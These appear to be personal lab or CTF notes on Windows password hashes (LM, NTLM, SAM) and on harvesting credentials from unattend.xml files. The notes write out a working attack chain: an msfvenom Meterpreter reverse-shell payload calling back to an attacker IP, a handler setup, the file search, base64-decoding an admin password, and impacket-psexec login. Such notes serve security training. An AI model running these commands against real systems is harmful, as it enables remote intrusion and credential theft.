Windows os stores hashed user account passwords locally in the SAM.
Hashing the process of converting a piece of data into another value/
windows versions upto windows server 2003 utilize two different types of hashes 
>LM
>NTLM --> v1,v2
Elevated priviliges are required in order to access and intract with the LSASS Process
Modern version of Windows the sam database encrypted with syskey.

LM is default hash algorithm in winos 
password is broken into two seven-charachter chunks.
All charcters are converted into upercase
each chunk is hashed seperately with DES algorithm.

NTLM is collection of auth protocols that are utilized in windows to facilitate auth between computers.
it needs a valid username and passwords
Does not split the hash into two chunks
Case sensitive
Allows the use of symbols and unicode charcters. hashed with md4

searching for windows hashes:
windows can automate a variety of repetitive tasks such as mass rollout.
the tool utilizes the configuration files that contain specific configuration and user account credentials.
The unattended windows setup utility utilizes one of the configuration files that contain user account and system configuration
C:\windows\Panther\unattend.xml
C:\windows\Panther\Autounattend.cml


We have kali and attacker machine
in the kali machine create the backdoor.exe file
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.40.5 LPORT=1234 -f exe > payload.exe

now create a simplehttpserver
python -m SimpleHTTPServer 80
since http module was not there

download the file from Attacker machine

in the kali 
msfconsole
use multi/handler
set the payload windows/x64/meterpreter/reverse_tcp
run

in windows/attacker machine run the payload file
to search the unattend file
we use the command search -f unattend.xml
after that download <path_of the file>
cat the file 
and we can see the username and passwd
copy that base 64 pass in txt
base64 -d pass 
Admin@123 boom
to login i use this psexec.py code 
https://github.com/milo2012/pentest_scripts/blob/master/impacket/psexec.py -->save with psexec.py 
usage
impacket-psexec Administrator@10.3.27.228 //username@ip 
dir C:\ /s /b | findstr /i "flag.*\.txt$" //it will search the flag





